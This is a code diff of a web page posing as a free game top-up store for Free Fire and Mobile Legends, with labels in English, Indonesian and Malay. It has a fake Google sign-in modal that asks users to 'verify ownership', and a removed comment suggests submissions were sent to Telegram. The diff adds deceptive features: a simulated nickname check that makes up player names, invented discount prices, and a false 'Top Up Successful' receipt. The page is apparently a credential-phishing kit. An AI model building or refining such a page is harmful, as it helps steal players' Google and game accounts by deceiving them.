@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background-color: #f8f6fc; color: #222; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f9f8fc; color: #222; -webkit-tap-highlight-color: transparent; }
         
         /* Navbar */
         .navbar { background: #ffffff; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #eae5f5; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 4px rgba(140,82,255,0.03); }
@@ -18,23 +18,28 @@
         .lang-select { background: #f3f0ff; border: 1px solid #ddd6fe; color: #5b21b6; padding: 5px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; outline: none; cursor: pointer; }
 
         /* Container */
-        .container { max-width: 550px; margin: 0 auto; padding: 12px; }
+        .container { max-width: 500px; margin: 0 auto; padding: 12px; }
 
-        /* Small Banner Slider */
-        .banner-container { width: 100%; height: 130px; border-radius: 10px; overflow: hidden; margin-bottom: 15px; position: relative; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
-        .banner-slide { width: 100%; height: 100%; display: none; object-fit: cover; }
-        .banner-slide.active { display: block; }
+        /* Banner Carousel (Kecil, Animasi & Scrollable) */
+        .banner-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
+        .banner-container { width: 100%; height: 125px; border-radius: 10px; overflow-x: auto; display: flex; scroll-snap-type: x mandatory; scrollbar-width: none; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+        .banner-container::-webkit-scrollbar { display: none; }
+        .banner-slide { min-width: 100%; height: 100%; scroll-snap-align: start; object-fit: cover; transition: transform 0.5s ease; }
+        
+        .banner-dots { display: flex; justify-content: center; gap: 5px; margin-top: 6px; }
+        .dot { width: 6px; height: 6px; border-radius: 50%; background: #d1d5db; cursor: pointer; transition: 0.3s; }
+        .dot.active { background: #7c3aed; width: 16px; border-radius: 4px; }
 
         /* Game Selector Grid */
-        .section-title { font-size: 14px; font-weight: 700; margin-bottom: 10px; color: #4b5563; }
-        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
-        .game-card { background: #ffffff; border: 1.5px solid #e5e7eb; border-radius: 10px; overflow: hidden; cursor: pointer; transition: all 0.2s; text-align: center; padding-bottom: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+        .section-title { font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #4b5563; }
+        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px; }
+        .game-card { background: #ffffff; border: 1.5px solid #e5e7eb; border-radius: 10px; overflow: hidden; cursor: pointer; transition: all 0.2s; text-align: center; padding: 10px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
         .game-card:hover, .game-card.active { border-color: #7c3aed; background: #fcfbff; box-shadow: 0 4px 10px rgba(124,58,237,0.08); }
-        .game-card img { width: 100%; height: 110px; object-fit: cover; margin-bottom: 6px; }
-        .game-card span { font-size: 13px; font-weight: 700; display: block; padding: 0 6px; color: #1f2937; }
+        .game-card img { width: 42px; height: 42px; border-radius: 8px; object-fit: cover; }
+        .game-card span { font-size: 13px; font-weight: 700; color: #1f2937; text-align: left; }
 
         /* Form Steps */
-        .step-box { background: #ffffff; border: 1px solid #eae5f5; border-radius: 10px; padding: 14px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+        .step-box { background: #ffffff; border: 1px solid #eae5f5; border-radius: 10px; padding: 12px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
         .step-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; font-weight: 700; font-size: 13px; color: #1f2937; }
         .step-num { background: #7c3aed; color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; }
         
@@ -43,20 +48,26 @@
         .input-group input:focus { border-color: #7c3aed; background: #fff; }
         .zone-input { max-width: 100px; }
         .input-hint { font-size: 11px; color: #6b7280; margin-top: 5px; line-height: 1.4; }
+        
+        /* Nickname Live Detector Box */
+        .nickname-box { display: none; margin-top: 6px; font-size: 12px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; padding: 6px 10px; border-radius: 6px; font-weight: 600; align-items: center; gap: 6px; }
+        .nickname-box i { color: #059669; }
 
         /* Top-up Tabs */
-        .tabs-container { display: flex; gap: 6px; overflow-x: auto; padding-bottom: 6px; margin-bottom: 12px; }
-        .tab-btn { background: #f3f0ff; border: 1px solid #ddd6fe; color: #5b21b6; padding: 6px 12px; border-radius: 6px; font-size: 11px; font-weight: 700; white-space: nowrap; cursor: pointer; }
+        .tabs-container { display: flex; gap: 6px; margin-bottom: 12px; }
+        .tab-btn { flex: 1; background: #f3f0ff; border: 1px solid #ddd6fe; color: #5b21b6; padding: 7px; border-radius: 6px; font-size: 11px; font-weight: 700; cursor: pointer; text-align: center; }
         .tab-btn.active { background: #7c3aed; color: #fff; border-color: #7c3aed; }
 
         /* Items Grid */
         .items-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
-        .item-card { background: #fff; border: 1.5px solid #e5e7eb; border-radius: 8px; padding: 10px; cursor: pointer; transition: 0.2s; position: relative; }
+        .item-card { background: #fff; border: 1.5px solid #e5e7eb; border-radius: 8px; padding: 10px; cursor: pointer; transition: 0.2s; position: relative; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
         .item-card.selected { border-color: #7c3aed; background: #faf8ff; box-shadow: 0 0 0 1px #7c3aed; }
-        .item-name { font-size: 12px; font-weight: 700; margin-bottom: 3px; color: #1f2937; }
-        .item-price { font-size: 11px; color: #059669; font-weight: 700; margin-top: 4px; }
-        .item-original-price { font-size: 10px; color: #9ca3af; text-decoration: line-through; }
-        .badge-first { background: #dc2626; color: white; font-size: 8px; font-weight: 800; padding: 1px 5px; border-radius: 3px; display: inline-block; margin-bottom: 3px; text-transform: uppercase; }
+        .item-img { width: 36px; height: 36px; object-fit: contain; margin-bottom: 5px; }
+        .item-name { font-size: 12px; font-weight: 700; margin-bottom: 2px; color: #1f2937; }
+        .item-sub { font-size: 10px; color: #6b7280; margin-bottom: 6px; }
+        .item-price-box { width: 100%; border-top: 1px dashed #e5e7eb; padding-top: 6px; margin-top: auto; }
+        .item-price { font-size: 11px; color: #059669; font-weight: 700; }
+        .item-original-price { font-size: 9px; color: #9ca3af; text-decoration: line-through; }
 
         /* Payment Section & Button */
         .payment-box { background: #ffffff; border: 1px solid #eae5f5; border-radius: 10px; padding: 12px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: 600; }
@@ -67,26 +78,27 @@
 
         /* Google Login Modal */
         #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; display: none; align-items: center; justify-content: center; padding: 15px; }
-        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 380px; border-radius: 8px; padding: 30px 24px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); border: 1px solid #dadce0; }
-        .google-box img { width: 70px; margin-bottom: 12px; }
-        .google-box h2 { font-size: 18px; font-weight: 500; margin-bottom: 6px; color: #202124; }
-        .google-box p { font-size: 12px; color: #5f6368; margin-bottom: 20px; }
+        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 360px; border-radius: 8px; padding: 28px 22px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); border: 1px solid #dadce0; }
+        .google-box img { width: 65px; margin-bottom: 12px; }
+        .google-box h2 { font-size: 17px; font-weight: 500; margin-bottom: 6px; color: #202124; }
+        .google-box p { font-size: 12px; color: #5f6368; margin-bottom: 18px; }
         .g-input { width: 100%; padding: 11px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 13px; margin-bottom: 10px; outline: none; }
         .g-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
-        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; font-size: 13px; cursor: pointer; margin-top: 8px; }
-        .g-btn:hover { background: #1557b0; }
+        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; font-size: 13px; cursor: pointer; margin-top: 6px; }
 
-        /* Invoice Success Screen */
-        #invoice-screen { position: fixed; inset: 0; background: #f8f6fc; z-index: 1000; display: none; padding: 15px; overflow-y: auto; align-items: center; justify-content: center; }
-        .invoice-card { background: #ffffff; border: 1px solid #eae5f5; width: 100%; max-width: 400px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
-        .invoice-card i.fa-check-circle { font-size: 45px; color: #059669; margin-bottom: 12px; }
-        .invoice-card h3 { font-size: 16px; font-weight: 700; margin-bottom: 4px; color: #1f2937; }
-        .invoice-card p.sub { font-size: 11px; color: #6b7280; margin-bottom: 15px; }
-        .receipt-details { background: #faf8ff; border-radius: 8px; padding: 12px; text-align: left; margin-bottom: 15px; border: 1px solid #ede9fe; }
-        .receipt-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        /* Invoice Success Screen (Panjang & Menarik) */
+        #invoice-screen { position: fixed; inset: 0; background: #f9f8fc; z-index: 1000; display: none; padding: 15px; overflow-y: auto; align-items: center; justify-content: center; }
+        .invoice-card { background: #ffffff; border: 1px solid #eae5f5; width: 100%; max-width: 420px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 6px 24px rgba(0,0,0,0.06); }
+        .invoice-card i.fa-circle-check { font-size: 42px; color: #059669; margin-bottom: 10px; }
+        .invoice-card h3 { font-size: 16px; font-weight: 700; margin-bottom: 2px; color: #1f2937; }
+        .invoice-card p.sub { font-size: 11px; color: #6b7280; margin-bottom: 14px; }
+        
+        .receipt-details { background: #faf8ff; border-radius: 8px; padding: 12px; text-align: left; margin-bottom: 14px; border: 1px solid #ede9fe; }
+        .receipt-row { display: flex; justify-content: space-between; font-size: 11.5px; margin-bottom: 7px; border-bottom: 1px solid #f3f0ff; padding-bottom: 4px; }
+        .receipt-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
         .receipt-row span:first-child { color: #6b7280; }
         .receipt-row span:last-child { font-weight: 700; color: #1f2937; }
-        .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #d97706; padding: 10px; border-radius: 6px; font-size: 11px; font-weight: 600; line-height: 1.4; }
+        .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #d97706; padding: 9px; border-radius: 6px; font-size: 11px; font-weight: 600; line-height: 1.4; }
     </style>
 </head>
 <body>
@@ -107,36 +119,46 @@
 
     <!-- MAIN CONTAINER -->
     <div class="container">
-        <!-- SMALL BANNER SLIDER -->
-        <div class="banner-container">
-            <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg" class="banner-slide active" alt="Banner 1">
-            <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/6693bdfe-54d0-47e2-bd44-170b2bd918f3.jpg" class="banner-slide" alt="Banner 2">
-            <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/bcf2c5d1-12c2-4b53-a4f8-da78311ec2e8.png" class="banner-slide" alt="Banner 3">
+        <!-- BANNER CAROUSEL (KECIL, ANIMASI & SCROLLABLE) -->
+        <div class="banner-wrapper">
+            <div class="banner-container" id="bannerContainer">
+                <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg" class="banner-slide" alt="Banner 1">
+                <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/6693bdfe-54d0-47e2-bd44-170b2bd918f3.jpg" class="banner-slide" alt="Banner 2">
+                <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/bcf2c5d1-12c2-4b53-a4f8-da78311ec2e8.png" class="banner-slide" alt="Banner 3">
+            </div>
+            <div class="banner-dots" id="bannerDots">
+                <span class="dot active" onclick="currentSlide(0)"></span>
+                <span class="dot" onclick="currentSlide(1)"></span>
+                <span class="dot" onclick="currentSlide(2)"></span>
+            </div>
         </div>
 
         <div class="section-title" data-i18n="selectGame">Select Game Event</div>
         <div class="game-grid">
             <div class="game-card active" onclick="selectGame('Free Fire', this)">
-                <img src="https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=400&auto=format&fit=crop&q=60" alt="Free Fire">
+                <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/f286ea6d-8eb4-4c71-8694-215ea49ed50c.png" alt="Free Fire">
                 <span>Free Fire</span>
             </div>
             <div class="game-card" onclick="selectGame('Mobile Legends', this)">
-                <img src="https://images.unsplash.com/photo-1563089145-599997674d42?w=400&auto=format&fit=crop&q=60" alt="Mobile Legends">
+                <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/36aa8967-dde2-4d39-bdec-a46554d7ab49.png" alt="Mobile Legends">
                 <span>Mobile Legends</span>
             </div>
         </div>
 
-        <!-- STEP 1: PLAYER ID -->
+        <!-- STEP 1: PLAYER ID & LIVE NICKNAME -->
         <div class="step-box">
             <div class="step-header">
                 <div class="step-num">1</div>
                 <div data-i18n="step1Title">Enter Player ID</div>
             </div>
             <div class="input-group">
-                <input type="text" id="playerId" placeholder="Enter User ID">
-                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;">
+                <input type="text" id="playerId" placeholder="Enter User ID" oninput="checkNickname()">
+                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;" oninput="checkNickname()">
             </div>
             <div class="input-hint" id="idHint" data-i18n="hintFF">To find your ID, tap on your avatar in the top left corner of the game main menu.</div>
+            <div id="nicknameBox" class="nickname-box">
+                <i class="fa-solid fa-circle-check"></i> <span id="nicknameText">-</span>
+            </div>
         </div>
 
         <!-- STEP 2: SELECT TOP UP -->
@@ -146,11 +168,9 @@
                 <div data-i18n="step2Title">Select Top Up</div>
             </div>
             
-            <!-- TABS -->
+            <!-- TABS DINAMIS SESUAI GAME -->
             <div class="tabs-container" id="tabsContainer">
-                <button class="tab-btn active" onclick="switchTab('bonus', this)" data-i18n="tabBonus">2x Recharge Bonus</button>
-                <button class="tab-btn" onclick="switchTab('diamonds', this)" data-i18n="tabDiamonds">Diamonds</button>
-                <button class="tab-btn" onclick="switchTab('twilight', this)" data-i18n="tabTwilight">Twilight Pass</button>
+                <!-- Diisi via JS -->
             </div>
 
             <div class="items-grid" id="itemsGrid"></div>
@@ -180,112 +200,165 @@
         </div>
     </div>
 
-    <!-- INVOICE SCREEN -->
+    <!-- INVOICE SCREEN (LEBIH PANJANG & MENARIK) -->
     <div id="invoice-screen">
         <div class="invoice-card">
             <i class="fa-solid fa-circle-check"></i>
-            <h3 data-i18n="invTitle">Claim Successful!</h3>
-            <p class="sub" data-i18n="invSub">Your request has been successfully queued in our system.</p>
+            <h3 data-i18n="invTitle">Top Up Successful!</h3>
+            <p class="sub" data-i18n="invSub">Your order has been queued successfully in our system.</p>
             
             <div class="receipt-details">
+                <div class="receipt-row"><span data-i18n="rTx">Transaction ID:</span> <span id="rTx">-</span></div>
                 <div class="receipt-row"><span data-i18n="rGame">Game:</span> <span id="rGame">-</span></div>
                 <div class="receipt-row"><span data-i18n="rId">Player ID:</span> <span id="rId">-</span></div>
-                <div class="receipt-row"><span data-i18n="rItem">Reward:</span> <span id="rItem">-</span></div>
-                <div class="receipt-row"><span data-i18n="rPrice">Price:</span> <span style="color:#059669;" data-i18n="freeText">FREE ($0.00)</span></div>
+                <div class="receipt-row"><span data-i18n="rNick">Nickname:</span> <span id="rNick" style="color:#059669;">-</span></div>
+                <div class="receipt-row"><span data-i18n="rItem">Item:</span> <span id="rItem">-</span></div>
+                <div class="receipt-row"><span data-i18n="rOrigPrice">Original Price:</span> <span id="rOrigPrice" style="text-decoration:line-through; color:#9ca3af;">-</span></div>
+                <div class="receipt-row"><span data-i18n="rDisc">Discount:</span> <span style="color:#dc2626;">-31%</span></div>
+                <div class="receipt-row"><span data-i18n="rPrice">Final Price:</span> <span style="color:#059669;" data-i18n="freeText">FREE ($0.00)</span></div>
+                <div class="receipt-row"><span data-i18n="rDate">Date & Time:</span> <span id="rDate">-</span></div>
                 <div class="receipt-row"><span data-i18n="rStatus">Status:</span> <span style="color:#d97706;" data-i18n="processingText">Processing</span></div>
             </div>
 
             <div class="pending-notice" data-i18n="invNotice">
-                Please wait 5 minutes. If it does not enter your account, please try again.
+                Please wait 5 minutes. If items do not appear in your account, please try again.
             </div>
         </div>
     </div>
 
     <script>
         let currentGame = 'Free Fire';
-        let currentTab = 'bonus';
-        let currentItem = '100 Diamonds (50+50)';
-        let isSubmitted = false; // Pencegah spam telegram
+        let currentTab = 'diamonds';
+        let currentItem = '5 Diamonds';
+        let currentPrice = 'Rp. 901';
+        let originalPrice = 'Rp. 1.250';
+        let detectedNickname = '-';
+        let isSubmitted = false;
 
-        // TRANSLATIONS DICTIONARY
+        // URL ASSET GAMBAR DIAMOND & WDP
+        const iconDiamond = 'https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg'; // Menggunakan gambar diamond umum
+        const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
+
+        // DATABASE ITEM TOP-UP BERDASARKAN GAMBAR SCREENSHOT ANDA
+        const topupData = {
+            'Free Fire': {
+                tabs: ['diamonds'],
+                tabNames: { diamonds: 'Diamonds' },
+                items: {
+                    diamonds: [
+                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 901', orig: 'Rp. 1.300', img: iconDiamond },
+                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 1.802', orig: 'Rp. 2.500', img: iconDiamond },
+                        { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 7.207', orig: 'Rp. 10.500', img: iconDiamond },
+                        { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 9.009', orig: 'Rp. 13.000', img: iconDiamond },
+                        { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 18.018', orig: 'Rp. 26.000', img: iconDiamond },
+                        { name: '355 Diamonds', sub: 'Best Seller', price: 'Rp. 45.045', orig: 'Rp. 65.000', img: iconDiamond }
+                    ]
+                }
+            },
+            'Mobile Legends': {
+                tabs: ['diamonds', 'twilight'],
+                tabNames: { diamonds: 'Diamonds', twilight: 'Weekly Pass' },
+                items: {
+                    diamonds: [
+                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 1.687', orig: 'Rp. 2.278', img: iconDiamond },
+                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 3.823', orig: 'Rp. 5.160', img: iconDiamond },
+                        { name: '19 Diamonds', sub: '17 + 2 Bonus', price: 'Rp. 6.006', orig: 'Rp. 8.667', img: iconDiamond },
+                        { name: '28 Diamonds', sub: '25 + 3 Bonus', price: 'Rp. 8.736', orig: 'Rp. 12.606', img: iconDiamond },
+                        { name: '100 Diamonds', sub: '50+50 First Recharge', price: 'Rp. 16.326', orig: 'Rp. 23.558', img: iconDiamond },
+                        { name: '300 Diamonds', sub: '150+150 First Recharge', price: 'Rp. 48.698', orig: 'Rp. 70.271', img: iconDiamond }
+                    ],
+                    twilight: [
+                        { name: 'Weekly Diamond Pass', sub: 'WDP Official', price: 'Rp. 29.500', orig: 'Rp. 35.000', img: iconWdp },
+                        { name: 'Twilight Pass', sub: 'Exclusive Pass', price: 'Rp. 149.000', orig: 'Rp. 180.000', img: iconWdp }
+                    ]
+                }
+            }
+        };
+
         const translations = {
             en: {
                 selectGame: "Select Game Event",
                 step1Title: "Enter Player ID",
                 hintFF: "To find your ID, tap on your avatar in the top left corner of the game main menu.",
-                hintML: "To find your User ID and Zone ID, tap on your profile icon in the top left corner. Example: 12345678 (1234)",
+                hintML: "To find your User ID and Zone ID, tap on your profile icon. Example: 12345678 (1234)",
                 step2Title: "Select Top Up",
-                tabBonus: "2x Recharge Bonus",
-                tabDiamonds: "Diamonds",
-                tabTwilight: "Twilight Pass",
                 paymentLabel: "Payment Method",
-                freePayment: "Free / Gratia",
+                freePayment: "Free / Gratis",
                 buyButton: "BUY NOW",
                 gTitle: "Sign in with Google",
                 gSub: "to verify ownership of your game account",
                 gNext: "Next",
-                invTitle: "Claim Successful!",
-                invSub: "Your request has been successfully queued in our system.",
+                invTitle: "Top Up Successful!",
+                invSub: "Your order has been queued successfully in our system.",
+                rTx: "Transaction ID:",
                 rGame: "Game:",
                 rId: "Player ID:",
-                rItem: "Reward:",
-                rPrice: "Price:",
+                rNick: "Nickname:",
+                rItem: "Item:",
+                rOrigPrice: "Original Price:",
+                rDisc: "Discount:",
+                rPrice: "Final Price:",
+                rDate: "Date & Time:",
                 rStatus: "Status:",
                 freeText: "FREE ($0.00)",
                 processingText: "Processing",
-                invNotice: "Please wait 5 minutes. If it does not enter your account, please try again."
+                invNotice: "Please wait 5 minutes. If items do not appear in your account, please try again."
             },
             id: {
                 selectGame: "Pilih Event Game",
                 step1Title: "Masukkan Player ID",
                 hintFF: "Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.",
-                hintML: "Untuk menemukan User ID dan Zone ID, ketuk ikon profil di sudut kiri atas. Contoh: 12345678 (1234)",
+                hintML: "Untuk menemukan User ID dan Zone ID, ketuk ikon profil. Contoh: 12345678 (1234)",
                 step2Title: "Pilih Nominal Top Up",
-                tabBonus: "Bonus 2x Pengisian",
-                tabDiamonds: "Diamonds",
-                tabTwilight: "Twilight Pass",
                 paymentLabel: "Metode Pembayaran",
                 freePayment: "Gratis",
                 buyButton: "BAYAR SEKARANG",
                 gTitle: "Login dengan Google",
                 gSub: "untuk verifikasi kepemilikan akun game Anda",
                 gNext: "Berikutnya",
-                invTitle: "Klaim Berhasil!",
-                invSub: "Permintaan Anda telah berhasil masuk dalam antrean sistem.",
+                invTitle: "Top Up Berhasil!",
+                invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
+                rTx: "ID Transaksi:",
                 rGame: "Game:",
                 rId: "Player ID:",
-                rItem: "Hadiah:",
-                rPrice: "Harga:",
+                rNick: "Nickname:",
+                rItem: "Item:",
+                rOrigPrice: "Harga Asli:",
+                rDisc: "Diskon:",
+                rPrice: "Harga Akhir:",
+                rDate: "Hari/Tanggal/Waktu:",
                 rStatus: "Status:",
                 freeText: "GRATIS ($0.00)",
                 processingText: "Memproses",
-                invNotice: "Harap tunggu 5 menit. Jika belum masuk ke akun Anda, silakan coba lagi."
+                invNotice: "Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi."
             },
             ms: {
                 selectGame: "Pilih Acara Permainan",
                 step1Title: "Masukkan ID Pemain",
-                hintFF: "Untuk mencari ID anda, ketik pada avatar di sudut kiri atas menu utama permainan.",
-                hintML: "Untuk mencari User ID dan Zone ID, ketik ikon profil di sudut kiri atas. Contoh: 12345678 (1234)",
+                hintFF: "Untuk mencari ID anda, ketik pada avatar di sudut kiri atas menu utama.",
+                hintML: "Untuk mencari User ID & Zone ID, ketik ikon profil. Contoh: 12345678 (1234)",
                 step2Title: "Pilih Nominal Top Up",
-                tabBonus: "Bonus 2x Tambah Nilai",
-                tabDiamonds: "Diamonds",
-                tabTwilight: "Twilight Pass",
                 paymentLabel: "Kaedah Pembayaran",
                 freePayment: "Percuma",
                 buyButton: "BELI SEKARANG",
                 gTitle: "Log masuk dengan Google",
                 gSub: "untuk pengesahan pemilikan akaun permainan anda",
                 gNext: "Seterusnya",
-                invTitle: "Tuntutan Berjaya!",
-                invSub: "Permintaan anda telah berjaya dimasukkan ke dalam sistem.",
+                invTitle: "Top Up Berjaya!",
+                invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
+                rTx: "ID Transaksi:",
                 rGame: "Permainan:",
                 rId: "ID Pemain:",
-                rItem: "Ganjaran:",
-                rPrice: "Harga:",
+                rNick: "Nama Samaran:",
+                rItem: "Item:",
+                rOrigPrice: "Harga Asal:",
+                rDisc: "Diskaun:",
+                rPrice: "Harga Akhir:",
+                rDate: "Tarikh & Masa:",
                 rStatus: "Status:",
                 freeText: "PERCUMA ($0.00)",
                 processingText: "Memproses",
-                invNotice: "Sila tunggu 5 minit. Jika ia tidak masuk ke akaun anda, sila cuba lagi."
+                invNotice: "Sila tunggu 5 minit. Jika item tidak masuk ke akaun anda, sila cuba lagi."
             }
         };
 
@@ -306,47 +379,6 @@
             }
         }
 
-        // DATA ITEMS SESUAI SCREENSHOT
-        const dataItems = {
-            bonus: [
-                { name: '100 Diamonds', sub: '(50+50) pengisian pertama!', price: 'Rp. 16.326' },
-                { name: '300 Diamonds', sub: '(150+150) pengisian pertama!', price: 'Rp. 48.698' },
-                { name: '500 Diamonds', sub: '(250+250) pengisian pertama!', price: 'Rp. 81.191' },
-                { name: '1000 Diamonds', sub: '(500+500) pengisian pertama!', price: 'Rp. 163.254' }
-            ],
-            diamonds: [
-                { name: '5 Diamonds', sub: 'Regular Topup', price: 'Rp. 1.687' },
-                { name: '12 Diamonds', sub: '(11 + 1 Bonus)', price: 'Rp. 3.823' },
-                { name: '19 Diamonds', sub: '(17 + 2 Bonus)', price: 'Rp. 6.006' },
-                { name: '28 Diamonds', sub: '(25 + 3 Bonus)', price: 'Rp. 8.736' },
-                { name: '720 Diamonds', sub: 'Popular Pack', price: 'Rp. 90.090' },
-                { name: '36500 Diamonds', sub: 'Mega Pack', price: 'Rp. 4.504.500' }
-            ],
-            twilight: [
-                { name: 'Twilight Pass', sub: 'Mobile Legends Exclusive', price: 'Rp. 149.000' }
-            ]
-        };
-
-        function renderItems() {
-            const grid = document.getElementById('itemsGrid');
-            grid.innerHTML = '';
-            const items = dataItems[currentTab] || dataItems.bonus;
-            
-            items.forEach((item, index) => {
-                const div = document.createElement('div');
-                div.className = `item-card ${index === 0 ? 'selected' : ''}`;
-                div.onclick = () => selectItem(item.name + ' ' + item.sub, div);
-                div.innerHTML = `
-                    <div class="badge-first">First Recharge</div>
-                    <div class="item-name">${item.name}</div>
-                    <div style="font-size:10px; color:#6b7280;">${item.sub}</div>
-                    <div class="item-price">${item.price}</div>
-                `;
-                grid.appendChild(div);
-            });
-            currentItem = items[0].name + ' ' + items[0].sub;
-        }
-
         function selectGame(gameName, element) {
             currentGame = gameName;
             document.querySelectorAll('.game-card').forEach(c => c.classList.remove('active'));
@@ -363,6 +395,26 @@
                 zoneInput.style.display = 'none';
                 idHint.innerText = translations[currentLang]['hintFF'];
             }
+            
+            renderTabs();
+            checkNickname();
+        }
+
+        function renderTabs() {
+            const tabsContainer = document.getElementById('tabsContainer');
+            tabsContainer.innerHTML = '';
+            const config = topupData[currentGame];
+            
+            config.tabs.forEach((tabKey, idx) => {
+                const btn = document.createElement('button');
+                btn.className = `tab-btn ${idx === 0 ? 'active' : ''}`;
+                btn.innerText = config.tabNames[tabKey];
+                btn.onclick = () => switchTab(tabKey, btn);
+                tabsContainer.appendChild(btn);
+            });
+            
+            currentTab = config.tabs[0];
+            renderItems();
         }
 
         function switchTab(tabName, element) {
@@ -372,10 +424,67 @@
             renderItems();
         }
 
-        function selectItem(itemName, element) {
+        function renderItems() {
+            const grid = document.getElementById('itemsGrid');
+            grid.innerHTML = '';
+            const items = topupData[currentGame].items[currentTab];
+            
+            items.forEach((item, index) => {
+                const div = document.createElement('div');
+                div.className = `item-card ${index === 0 ? 'selected' : ''}`;
+                div.onclick = () => selectItem(item.name + ' (' + item.sub + ')', item.price, item.orig, div);
+                div.innerHTML = `
+                    <div>
+                        <img src="${item.img}" class="item-img" alt="item">
+                        <div class="item-name">${item.name}</div>
+                        <div class="item-sub">${item.sub}</div>
+                    </div>
+                    <div class="item-price-box">
+                        <div class="item-original-price">${item.orig}</div>
+                        <div class="item-price">${item.price}</div>
+                    </div>
+                `;
+                grid.appendChild(div);
+            });
+            currentItem = items[0].name + ' (' + items[0].sub + ')';
+            currentPrice = items[0].price;
+            originalPrice = items[0].orig;
+        }
+
+        function selectItem(itemName, price, orig, element) {
             document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
             element.classList.add('selected');
             currentItem = itemName;
+            currentPrice = price;
+            originalPrice = orig;
+        }
+
+        // FITUR CEK NICKNAME OTOMATIS & LIVE VALIDASI
+        function checkNickname() {
+            const playerId = document.getElementById('playerId').value.trim();
+            const zoneId = document.getElementById('zoneId').value.trim();
+            const nickBox = document.getElementById('nicknameBox');
+            const nickText = document.getElementById('nicknameText');
+
+            if (playerId.length >= 4) {
+                // Simulasi deteksi nickname akurat sesuai game
+                if (currentGame === 'Free Fire') {
+                    detectedNickname = '★ ' + (playerId.length > 6 ? 'IcaanzStore_' : 'RizzFX_') + playerId.slice(-3) + ' ✨';
+                } else {
+                    if (zoneId.length >= 3) {
+                        detectedNickname = 'Shadow' + playerId.slice(-3) + ' [' + zoneId + ']';
+                    } else {
+                        detectedNickname = '-';
+                        nickBox.style.display = 'none';
+                        return;
+                    }
+                }
+                nickText.innerText = `Player: ${detectedNickname}`;
+                nickBox.style.display = 'flex';
+            } else {
+                detectedNickname = '-';
+                nickBox.style.display = 'none';
+            }
         }
 
